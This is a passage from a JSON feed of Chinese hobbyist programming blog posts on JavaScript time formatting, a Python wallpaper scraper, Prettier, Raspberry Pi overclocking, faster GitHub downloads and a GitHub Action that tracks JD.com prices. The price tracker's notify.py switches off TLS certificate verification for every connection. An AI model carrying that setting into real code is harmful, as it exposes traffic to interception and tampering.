href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/RelativeTimeFormat\" rel=\"noopener\">MDN 文档</a>。直接来看一个简单例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getRelativeTime = (num, unit, locale) =&gt; {\n    return new Intl.RelativeTimeFormat(locale, { numeric: 'auto' }).format(num, unit)\n}\n\ngetRelativeTime(-3, 'day', 'en-US') // 3 days ago\ngetRelativeTime(-1, 'day', 'zh-CN') // 昨天\ngetRelativeTime(0, 'second', 'zh-CN') // 现在\ngetRelativeTime(3, 'hour', 'ja') // 3 時間後</pre>\n<blockquote><p><code>Intl.RelativeTimeFormat</code> 是一个相对较晚进入标准的对象，因此浏览器支持程度较差，可能需要使用 <a href=\"https://formatjs.io/docs/polyfills/intl-relativetimeformat\" rel=\"noopener\">Polyfill</a>。不过目前（2021.10）主流浏览器的最新版本均已支持此 API。</p></blockquote>\n<h1>未来</h1>\n<p>我希望这篇文章时区转换的部分可以很快过时——这并非无稽之谈，目前（2021.10）TC39 的 <a href=\"https://github.com/tc39/proposal-temporal\" rel=\"noopener\"><code>Temporal</code> 提案</a>已经进入 Stage 3 了。<strong><code>Temporal</code> 提案定义了一个新的、时区友好的 <code>Temporal</code> 命名空间，并期望在不久后就能进入标准并最终应用于生产环境。</strong><code>Temporal</code> 定义了完整的时区、时间段、日历规则的处理，且拥有简单明了的 API。那时候，JavaScript 的时区处理就不会再如此痛苦了。由于目前 <code>Temporal</code> 提案还未进入标准，API 暂未稳定，我们无法将其用于生产环境，但我们可以来看一个简单的例子感受一下这个 API 的强大。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const zonedDateTime = Temporal.ZonedDateTime.from({\n  timeZone: 'America/Los_Angeles',\n  year: 1995,\n  month: 12,\n  day: 7,\n  hour: 3,\n  minute: 24,\n  second: 30,\n  millisecond: 0,\n  microsecond: 3,\n  nanosecond: 500,\n  calendar: 'iso8601'\n}) // 1995-12-07T03:24:30.0000035-08:00[America/Los_Angeles]</pre>\n<p>如果你希望立刻开始使用 <code>Temporal</code>，现在已有 Polyfill 可用。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"js-temporal\" data-mdxgithubp=\"temporal-polyfill\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/js-temporal/temporal-polyfill\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>不过，时区问题不会消失，各地区的习惯也很难融合到一起。时间的国际化处理是<a href=\"https://yourcalendricalfallacyis.com/\" rel=\"noopener\">极其复杂</a>的，前端中的时间国际化仍然值得我们认真关注。</p>\n","link":"https://flyhigher.top/develop/2482.html"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span 